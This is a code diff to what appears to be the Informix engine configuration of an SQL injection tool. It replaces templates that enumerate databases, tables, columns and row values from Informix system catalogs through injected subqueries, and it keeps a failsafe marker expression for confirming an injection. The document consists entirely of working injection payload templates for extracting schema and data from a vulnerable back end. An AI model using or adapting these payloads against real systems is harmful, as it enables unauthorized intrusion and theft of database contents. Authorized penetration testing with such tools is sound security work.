@@ -24,12 +24,15 @@ resource:
            || trim(t.name)
            || '${separator_qte_sql}0${enclose_value_sql}'
            rr
-       from
-           (select distinct name from sysmaster:informix.sysdatabases) t,
-           (select distinct name from sysmaster:informix.sysdatabases) t1
-       where t.name >= t1.name
-       group by 1
-       ${limit}
+       from sysmaster:informix.sysdatabases t
+       where ${limit} = (select count(*) from sysmaster:informix.sysdatabases t1 where t.name >= t1.name)
+       union all
+       select '' as rr
+       where 0 = (
+           select count(*)
+           from sysmaster:informix.sysdatabases t
+           where ${limit} = (select count(*) from sysmaster:informix.sysdatabases t1 where t.name >= t1.name)
+       )
    ) a
 
   table: |
@@ -43,12 +46,15 @@ resource:
            || trim(t.tabname)
            || '${separator_qte_sql}0${enclose_value_sql}'
            rr
-       from
-           (select distinct tabname from ${database}:informix.systables) t,
-           (select distinct tabname from ${database}:informix.systables) t1
-       where t.tabname >= t1.tabname
-       group by 1
-       ${limit}
+       from ${database}:informix.systables t
+       where ${limit} = (select count(*) from ${database}:informix.systables t1 where t.tabname >= t1.tabname)
+       union all
+       select '' as rr
+       where 0 = (
+           select count(*)
+           from ${database}:informix.systables t
+           where ${limit} = (select count(*) from ${database}:informix.systables t1 where t.tabname >= t1.tabname)
+       )
    ) a
 
   column: |
@@ -59,15 +65,18 @@ resource:
    from (
        select
            '${enclose_value_sql}'
-           || trim(t.colname)
+           || trim(c.colname)
            || '${separator_qte_sql}0${enclose_value_sql}'
            rr
-       from
-           (select distinct colname from ${database}:informix.syscolumns c join ${database}:informix.systables t on c.tabid = t.tabid where tabname = '${table}') t,
-           (select distinct colname from ${database}:informix.syscolumns c join ${database}:informix.systables t on c.tabid = t.tabid where tabname = '${table}') t1
-       where t.colname >= t1.colname
-       group by 1
-       ${limit}
+       from ${database}:informix.syscolumns c join ${database}:informix.systables t on c.tabid = t.tabid where tabname = '${table}'
+       and ${limit} = (select count(*) from ${database}:informix.syscolumns c1 join ${database}:informix.systables t1 on c1.tabid = t1.tabid where tabname = '${table}' and c.colname >= c1.colname)
+       union all
+       select '' as rr
+       where 0 = (
+           select count(*)
+           from ${database}:informix.syscolumns c join ${database}:informix.systables t on c.tabid = t.tabid where tabname = '${table}'
+           and ${limit} = (select count(*) from ${database}:informix.syscolumns c1 join ${database}:informix.systables t1 on c1.tabid = t1.tabid where tabname = '${table}' and c.colname >= c1.colname)
+       )
    ) a
 
   row:
@@ -79,15 +88,18 @@ resource:
     from (
         select
             '${enclose_value_sql}'
-            || trim(t.s)
+            || trim(${fields})
             || '${separator_qte_sql}0${enclose_value_sql}'
             rr
-        from
-           (select distinct ${fields} s from ${database}:${table}) t,
-           (select distinct ${fields} s from ${database}:${table}) t1
-        where t.s >= t1.s
-        group by 1
-        ${limit}
+        from ${database}:${table} t
+        where ${limit} = (select count(*) from ${database}:${table})
+        union all
+        select '' as rr
+        where 0 = (
+           select count(*)
+           from ${database}:${table}
+           where ${limit} = (select count(*) from ${database}:${table})
+        )
     ) a
    fields:
     field: trim(nvl(${field.value}, ''))
@@ -106,7 +118,7 @@ strategy:
    from (
        ${injection}
    ) x
-  limit: having count(*) between ${limit.value} and ${limit.value}
+  limit: ${limit.value}
   failsafe: |
    select
        (1337${indice}7330%2b1)
